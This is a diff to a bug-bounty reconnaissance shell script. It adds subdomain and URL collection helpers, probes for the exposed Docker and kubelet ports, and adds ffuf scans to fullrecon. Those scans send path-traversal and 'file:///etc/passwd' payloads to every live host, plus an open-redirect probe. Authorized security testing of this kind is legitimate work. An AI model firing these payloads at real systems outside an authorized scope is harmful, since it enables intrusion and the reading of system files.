@@ -71,12 +71,57 @@ getalive() {
   # sperate http and https compare if http doest have or redirect to https put in seperate file
   # compare if you go to https if it automaticly redirects to https if not when does it in the page if never
   echo "[+] Check live hosts"
-  cat clean.subdomains | httpx -silent -timeout 50 -status-code -ports 80,443,8000,8080,8443 -o HTTPOK
+  cat clean.subdomains | httpx -silent -status-code -tech-detect -ports 80,443,2375,8000,8080,8443,10250 -o HTTPOK
   cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
   cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
   cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
 }
 
+# see this example on https://github.com/pdelteil/BugBountyHuntingScripts/blob/main/bbrf_helper.sh
+# thanks for this
+
+bbrfAddDomainsAndUrls() {
+    for p in $(bbrf programs); do
+        bbrf scope in -p "$p" | \
+        subfinder -silent | \
+        dnsx -silent | \
+        bbrf domain add - -s subfinder --show-new -p "$p" | \
+        grep -v DEBUG | notify -silent
+        
+        bbrf urls -p "$p" | httpx -silent | bbrf url add - -s httpx --show-new -p "$p" | \
+        grep -v DEBUG | notify -silent
+    done
+}
+bbrfresolvedomains() {
+    for p in $(bbrf programs); do
+        bbrf domains --view unresolved -p $p | \
+        dnsx -silent -a -resp | tr -d '[]' | tee \
+            >(awk '{print $1":"$2}' | bbrf domain update - -p $p -s dnsx) \
+            >(awk '{print $1":"$2}' | bbrf domain add - -p $p -s dnsx) \
+            >(awk '{print $2":"$1}' | bbrf ip add - -p $p -s dnsx) \
+            >(awk '{print $2":"$1}' | bbrf ip update - -p $p -s dnsx)
+    done
+}
+nginxpath() {
+    echo "Test nginx path traversal" | notify -silent
+    ffuf -c -w ALLHTTP -u FUZZ////////../../../../../etc/passwd -mr "root:x" -or -o nginxpath.txt
+    [ -s "nginxpath.txt" ] && echo 'nginx traversal found' | notify -silent
+    [ -s "nginxpath.txt" ] && cat nginxpath.txt | notify -silent
+}
+
+geojson() {
+    echo "Test geojson redirect" | notify -silent 
+    ffuf -c -w ALLHTTP -u FUZZ/api/geojson?url=file:///etc/passwd -mr "root:x" -or -o geojson.txt
+    [ -s "geojson.txt" ] && echo "geojson redirect found" | notify -silent
+    [ -s "geojson.txt" ] && cat geojson.txt | notify -silent
+}
+
+textinjection() {
+    echo "Test text injection" | notify -silent
+    ffuf -c -w ALLHTTP -u FUZZ///example.com -mr 'Cannot GET' -or -o textinjection.txt
+    [ -s "textinjection.txt" ] && echo "text injection found" | notify -silent
+    [ -s "textinjection.txt" ] && cat textinjection.txt | notify -silent
+}
 getaliveAxiom() {
   # sperate http and https compare if http doest have or redirect to https put in seperate file
   # compare if you go to https if it automaticly redirects to https if not when does it in the page if never
@@ -315,6 +360,9 @@ fullrecon() {
   #resolving
   # checkscope
   getalive
+  nginxpath
+  geojson
+  textinjection
   getdata
   screenshot
   dnsrecords
@@ -323,13 +371,13 @@ fullrecon() {
   subtakeover
   gitexposed
   bypass4xx
-  Corstest
-  crawler
-  getjsurls
+  #Corstest
+  # crawler
+  # getjsurls
   # getjsdata
-  secretfinder
-  paramspider
-  nucaxiom
+  # secretfinder
+  # paramspider
+  #nucauto
   # xsshunter
   #  scanner
   #  waybackrecon
